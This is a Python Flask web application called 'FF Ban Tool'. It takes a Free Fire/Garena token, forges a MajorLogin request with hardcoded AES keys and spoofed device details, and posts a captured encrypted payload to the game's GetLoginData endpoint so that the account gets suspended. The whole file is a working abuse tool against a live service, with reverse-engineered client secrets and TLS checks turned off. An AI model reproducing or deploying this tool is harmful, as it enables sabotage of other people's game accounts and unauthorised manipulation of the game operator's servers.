import os
import sys
import json
import base64
import requests
import urllib3
from datetime import datetime
from flask import Flask, request, render_template_string

urllib3.disable_warnings()

try:
    from Crypto.Cipher import AES
    from Crypto.Util.Padding import pad, unpad
except ImportError:
    raise ImportError("pycryptodome is required")

try:
    import MajoRLogin_pb2 as mLpB
    import MajorLoginRes_pb2 as mLrPb
except ImportError:
    raise ImportError("Protobuf files not found")

app = Flask(__name__)

# ============================================================
#  🚨  UPDATE THESE FOR YOUR TARGET VERSION (e.g., OB54)  🚨
# ============================================================

# 1️⃣ Client version (from MajorLogin protobuf)
CLIENT_VERSION = "1.120.1"                # <-- change to OB54 (e.g., "1.121.1")
CLIENT_VERSION_CODE = "2019118695"        # <-- change to OB54 code

# 2️⃣ The encrypted payload sent to /GetLoginData (base64 string)
#    You MUST capture this from the official client.
BODY_BASE64 = (
    'vGkQhkkYHjne06dPbmJgb36BQ1NdLgk8J+uc+z4/9t4OZ19iWMyn5cH/Pe/DgGHrwHxJ+dRKGho2LCErl+rBWEf/6aWcFflRXiEsvPiGKM3809a+vci8mAQBREdizRWQ6bdeLnlztsqBvlB5OU8WFlmGxsU8UY1U3Zp/eLNTbq0DHqjOxziR+ylXgLlonsckeKvaxa4YE540eXi+9v4ilJunUibievpqUip6XDAyKV7o1spVxiaP0z4d8MLosbeYthPAnK5ykeE8IpnYaru0oDN8o90r820h04frRPJBszlDiarwdjgXaiyeQqAiOgEN63gUoVq2rd0JfYGaHN2f2kJxxO9uCYxyJ6IhCzQq8yAJT2asKa9u7gWB1bB/fJxq4nVxY8am8DI+rqIDvVSF3EdQBDh9qipPFCd0gZx7kDVg/9vM79YAE+FnDgGY3D/niKWsu66SL9+bRcghZxcCMOzKwvRe7hCRU2pDjBw0MRvPnCCa9KpEuO4CgWz+++SP9whlI0dWCi9/snDCN6i9V2TYrSWfbg1i2TRipquGUoi/cP1xPBeMwQlzlf4APMQzvT8MOQotqry+y1+koTpwRKlWgu7QLmiumn4dwd9HARVMThSH46kwlD8xep4sLVf6/BbjWixBMVRKFi1w9zpVVe+w6rBYhtBHXfjqjg2sCzF1mlBabMbW4L2yXEmABaQG/l0jmaGEWh6kzMY9T1nzV1Wcw5lF7X+pwQEnAn6i5coowNGKrTGUJ2wa3+tAxGcm9zozCvj8yd2pOXmta46GoREDQk+U99uHHvjqzsSNeBq8ffL5zibtv0pZPhnUuSP76YkhCcdtDilaecBElnt9eFfo8cy2B3Z0wbhG20nKNfYuhgZMZuSPRjmQphlfyl1hpoSG5xMQ7bdqZAkoTkZlFpCL4y02yUlImI7Z8jnA3i4un3UOq1rXrMza+bqNsMhrJ/aUS3mnoXr23yzuUc56zyYQtzJx6VCupsHraP7brcDbBS76Gp2o0oT2iE4Y55ZyAEgdt307DzJknHEHdGuoOG4Yzy5bI7HnukmnUjoiIdJEr7iJdOLppdB+ZDXPkHps5ysskdapRp0i2x1gMpW9XU1LY1cNAsTmAvHcz2GZA2OjtvS0roiay2rkUqNgmN8cPygK3j6ycfpkHc1PkUnmG1CNjMy3qP7c18qvDdSYfiq99Wra4l5L2dV3dE/kGpc1fgwWo94UPIes67wg/TrRR85GxPcpIX3IUOGMyEX1VWJTS2PvTm3S4xrerobDKG5V'
)   # <--- REPLACE with your OB54 payload

# ============================================================

# Other constants (unchanged)
AeSkEy = b'Yg&tc%DEuh6%Zc^8'
AeSiV  = b'6oyZDr22E3ychjM%'
mLuRl  = "https://loginbp.ggpolarbear.com/MajorLogin"

mLhDr  = {
    "User-Agent": "Dalvik/2.1.0 (Linux; U; Android 11; SM-S908E Build/TP1A.220624.014)",
    "Connection": "Keep-Alive",
    "Accept-Encoding": "gzip",
    "Content-Type": "application/octet-stream",
    "Expect": "100-continue",
    "X-GA": "v1 1",
    "X-Unity-Version": "2018.4.11f1",
    "ReleaseVersion": "OB54"   # will be overridden by JWT's version
}

# ---------- Helper functions (copied from your CLI script) ----------

def decode_ff_name(b64_str):
    try:
        if not b64_str:
            return "Unknown"
        key = b"1e5898ccb8dfdd921f9bdea848768b64a201"
        b64_str = b64_str.strip()
        b64_str += "=" * ((4 - len(b64_str) % 4) % 4)
        encrypted_bytes = base64.b64decode(b64_str)
        decrypted_bytes = bytearray()
        for i, byte in enumerate(encrypted_bytes):
            key_byte = key[i % len(key)]
            decrypted_bytes.append(byte ^ key_byte)
        name = decrypted_bytes.decode('utf-8', errors='ignore')
        return name if name else "Unknown"
    except Exception:
        return "Unknown"

def enc(d):
    return AES.new(AeSkEy, AES.MODE_CBC, AeSiV).encrypt(pad(d, 16))

def dec(d):
    return unpad(AES.new(AeSkEy, AES.MODE_CBC, AeSiV).decrypt(d), 16)

def build_majorlogin(tok, open_id, p_type):
    m = mLpB.MajorLogin()
    m.event_time = str(datetime.now())[:-7]
    m.game_name = "free fire"
    m.platform_id = p_type
    m.client_version = CLIENT_VERSION          # dynamic
    m.system_software = "Android OS 9 / API-28"
    m.system_hardware = "Handheld"
    m.telecom_operator = "Verizon"
    m.network_type = "WIFI"
    m.screen_width = 1920
    m.screen_height = 1080
    m.screen_dpi = "280"
    m.processor_details = "ARM64 FP ASIMD AES VMH | 2865 | 4"
    m.memory = 3003
    m.gpu_renderer = "Adreno (TM) 640"
    m.gpu_version = "OpenGL ES 3.1 v1.46"
    m.unique_device_id = "Google|34a7dcdf-a7d5-4cb6-8d7e-3b0e448a0c57"
    m.client_ip = "223.191.51.89"
    m.language = "en"
    m.open_id = open_id
    m.open_id_type = str(p_type)
    m.device_type = "Handheld"
    m.access_token = tok
    m.platform_sdk_id = 1
    m.client_using_version = "7428b253defc164018c604a1ebbfebdf"
    m.login_by = 3
    m.channel_type = 3
    m.cpu_type = 2
    m.cpu_architecture = "64"
    m.client_version_code = CLIENT_VERSION_CODE   # dynamic
    m.login_open_id_type = p_type
    m.origin_platform_type = str(p_type)
    m.primary_platform_type = str(p_type)
    return enc(m.SerializeToString())

def decode_jwt(token):
    try:
        payload_part = token.split('.')[1]
        payload_part += "=" * ((4 - len(payload_part) % 4) % 4)
        decoded_bytes = base64.urlsafe_b64decode(payload_part)
        decoded_str = decoded_bytes.decode('utf-8')
        return json.loads(decoded_str)
    except Exception:
        return {}

def get_base_url(lock_region):
    """Returns the appropriate base client URL based on the account's lock region."""
    lock_region = lock_region.upper()
    ind_regions = ["IND"]
    us_regions = ["BR", "US", "NA", "SAC"]
    if lock_region in ind_regions:
        return "https://client.ind.freefiremobile.com"
    elif lock_region in us_regions:
        return "https://client.us.freefiremobile.com"
    else:
        return "https://clientbp.ggpolarbear.com"

def fetch_majorlogin_jwt(tok):
    """Return (jwt_token, error_message)"""
    if tok.startswith("ey") and "." in tok:
        return tok, None

    oId = None
    try:
        r = requests.get(
            f"https://100067.connect.garena.com/oauth/token/inspect?token={tok}",
            headers={"User-Agent": "Mozilla/5.0"},
            timeout=5
        ).json()
        oId = r.get("open_id")
    except:
        pass

    if not oId:
        try:
            uid_headers = {"access-token": tok, "user-agent": "Mozilla/5.0"}
            uid_res = requests.get(
                "https://prod-api.reward.ff.garena.com/redemption/api/auth/inspect_token/",
                headers=uid_headers,
                verify=False,
                timeout=5
            ).json()
            uid = uid_res.get("uid")
            if uid:
                openid_res = requests.post(
                    "https://topup.pk/api/auth/player_id_login",
                    headers={"Content-Type": "application/json"},
                    json={"app_id": 100067, "login_id": str(uid)},
                    verify=False,
                    timeout=5
                ).json()
                oId = openid_res.get("open_id")
        except:
            pass

    if not oId:
        return None, "Failed to extract Open ID. Token invalid or expired."

    platforms = [8, 3, 4, 6]
    for p_type in platforms:
        pl = build_majorlogin(tok, oId, p_type)
        try:
            x = requests.post(mLuRl, headers=mLhDr, data=pl, timeout=10, verify=False)
            if x.status_code == 200:
                res = mLrPb.MajorLoginRes()
                try:
                    res.ParseFromString(dec(x.content))
                except:
                    res.ParseFromString(x.content)
                if res.token:
                    return res.token, None
        except:
            continue

    return None, "MajorLogin failed. Account may be blocked or platform mismatch."

def trigger_injection(jwt_token, version, base_url):
    api_url = f"{base_url}/GetLoginData"
    headers = {
        'Authorization': f'Bearer {jwt_token}',
        'X-Unity-Version': '2018.4.11f1',
        'X-GA': 'v1 1',
        'ReleaseVersion': str(version),
        'Content-Type': 'application/x-www-form-urlencoded',
        'User-Agent': 'Dalvik/2.1.0 (Linux; Android)',
        'Accept-Encoding': 'gzip'
    }
    body = base64.b64decode(BODY_BASE64)
    return requests.post(api_url, headers=headers, data=body, timeout=20, verify=False)

# ---------- HTML template (embedded) ----------
PAGE_TEMPLATE = '''
<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>FF Ban Tool</title>
    <style>
        body {
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            background: #0b0e14;
            color: #e0e0e0;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            margin: 0;
            padding: 20px;
        }
        .container {
            background: #1a1f2b;
            padding: 40px 50px;
            border-radius: 16px;
            box-shadow: 0 8px 30px rgba(0,0,0,0.7);
            max-width: 800px;
            width: 100%;
            border: 1px solid #2c3545;
        }
        h1 {
            text-align: center;
            font-weight: 300;
            color: #7aa5ff;
            letter-spacing: 1px;
            margin-top: 0;
            border-bottom: 1px solid #2c3545;
            padding-bottom: 15px;
        }
        h1 small {
            display: block;
            font-size: 0.5em;
            color: #8899bb;
            margin-top: 8px;
        }
        .field {
            margin: 25px 0;
        }
        label {
            display: block;
            margin-bottom: 8px;
            font-weight: 500;
            color: #b0c4de;
        }
        input[type="text"] {
            width: 100%;
            padding: 14px 16px;
            background: #0d121c;
            border: 1px solid #2f3a4f;
            border-radius: 10px;
            color: #fff;
            font-size: 16px;
            box-sizing: border-box;
            transition: 0.2s;
        }
        input[type="text"]:focus {
            border-color: #7aa5ff;
            outline: none;
            box-shadow: 0 0 0 3px rgba(122,165,255,0.2);
        }
        button {
            width: 100%;
            padding: 16px;
            background: #3a6bd5;
            border: none;
            border-radius: 10px;
            color: white;
            font-size: 20px;
            font-weight: bold;
            cursor: pointer;
            transition: 0.2s;
            letter-spacing: 1px;
        }
        button:hover {
            background: #2f5bbd;
            transform: translateY(-2px);
            box-shadow: 0 6px 20px rgba(58,107,213,0.4);
        }
        button:active {
            transform: translateY(0);
        }
        .result {
            margin-top: 30px;
            padding: 20px;
            border-radius: 10px;
            background: #111827;
            border-left: 6px solid #3a6bd5;
        }
        .result.success { border-left-color: #2ecc71; }
        .result.error { border-left-color: #e74c3c; }
        .result h3 { margin: 0 0 12px 0; color: #ccc; }
        .result .info { display: flex; flex-wrap: wrap; gap: 8px 20px; }
        .result .info span { background: #1f2a3a; padding: 4px 12px; border-radius: 20px; font-size: 14px; }
        .result .info .label { color: #8899bb; }
        .result .info .value { color: #fff; font-weight: 500; }
        .result .msg { margin-top: 15px; font-size: 18px; }
        .msg.error { color: #e74c3c; }
        .msg.success { color: #2ecc71; }
        .result .server-response {
            margin-top: 15px;
            background: #0d121c;
            padding: 12px;
            border-radius: 8px;
            font-family: monospace;
            font-size: 14px;
            white-space: pre-wrap;
            word-break: break-all;
            color: #bbccdd;
            border: 1px solid #2c3545;
        }
        .footer {
            margin-top: 30px;
            text-align: center;
            font-size: 13px;
            color: #556;
        }
        .footer a { color: #7aa5ff; text-decoration: none; }
        .loader {
            display: none;
            text-align: center;
            margin: 20px 0;
            color: #7aa5ff;
        }
        .loader.active { display: block; }
        .spinner {
            border: 4px solid #1f2a3a;
            border-top: 4px solid #7aa5ff;
            border-radius: 50%;
            width: 40px;
            height: 40px;
            animation: spin 0.8s linear infinite;
            margin: 0 auto 10px;
        }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
    </style>
</head>
<body>
    <div class="container">
        <h1>🔫 FF Ban Tool <small>Enter JWT or Access Token</small></h1>

        <form method="POST" action="/" onsubmit="showLoader()">
            <div class="field">
                <label for="token">Token</label>
                <input type="text" name="token" id="token" placeholder="Paste your token here..." required>
            </div>
            <button type="submit">💥 BAN</button>
        </form>

        <div id="loader" class="loader">
            <div class="spinner"></div>
            <div>Processing... Please wait.</div>
        </div>

        {% if result %}
        <div class="result {{ 'success' if result.success else 'error' }}">
            <h3>📋 Result</h3>
            <div class="info">
                <span><span class="label">Nickname:</span> <span class="value">{{ result.nickname }}</span></span>
                <span><span class="label">Account ID:</span> <span class="value">{{ result.account_id }}</span></span>
                <span><span class="label">Region:</span> <span class="value">{{ result.region }}</span></span>
                <span><span class="label">Version:</span> <span class="value">{{ result.version }}</span></span>
            </div>
            <div class="msg {{ 'success' if result.success else 'error' }}">
                {{ result.message }}
            </div>
            {% if result.response_text %}
            <div class="server-response">
                <strong>Server response:</strong><br>{{ result.response_text }}
            </div>
            {% endif %}
        </div>
        {% endif %}

        <div class="footer">
            Built for Vercel · <a href="/">Reset</a>
        </div>
    </div>

    <script>
        function showLoader() {
            document.getElementById('loader').classList.add('active');
        }
    </script>
</body>
</html>
'''

# ---------- Flask routes ----------
@app.route('/', methods=['GET', 'POST'])
def index():
    if request.method == 'GET':
        return render_template_string(PAGE_TEMPLATE, result=None)

    token = request.form.get('token', '').strip()
    if not token:
        return render_template_string(PAGE_TEMPLATE, result={
            'success': False,
            'message': 'Please enter a valid token.',
            'nickname': '—',
            'account_id': '—',
            'region': '—',
            'version': '—'
        })

    # Step 1: Authentication
    jwt_token, err = fetch_majorlogin_jwt(token)
    if not jwt_token:
        return render_template_string(PAGE_TEMPLATE, result={
            'success': False,
            'message': f'Authentication failed: {err}',
            'nickname': '—',
            'account_id': '—',
            'region': '—',
            'version': '—'
        })

    # Step 2: Decode JWT
    user_data = decode_jwt(jwt_token)
    raw_nick = user_data.get('nickname', '')
    nickname = decode_ff_name(raw_nick)
    region = user_data.get('lock_region', user_data.get('region', 'IND'))
    account_id = user_data.get('account_id', 'Unknown')
    version = user_data.get('release_version', 'Latest')

    # Step 3: Determine base URL
    base_url = get_base_url(region)

    # Step 4: Inject ban payload
    try:
        ban_resp = trigger_injection(jwt_token, version, base_url)
    except Exception as e:
        return render_template_string(PAGE_TEMPLATE, result={
            'success': False,
            'message': f'Injection request failed: {str(e)}',
            'nickname': nickname,
            'account_id': account_id,
            'region': region,
            'version': version
        })

    # Build result
    if ban_resp.status_code == 200:
        result = {
            'success': True,
            'message': '✅ Account successfully banned (suspended)!',
            'nickname': nickname,
            'account_id': account_id,
            'region': region,
            'version': version
        }
    else:
        result = {
            'success': False,
            'message': f'❌ Injection failed with status {ban_resp.status_code}',
            'nickname': nickname,
            'account_id': account_id,
            'region': region,
            'version': version,
            'response_text': ban_resp.text[:500]  # show first 500 chars
        }

    return render_template_string(PAGE_TEMPLATE, result=result)

# For local testing
if __name__ == '__main__':
    app.run(debug=True)
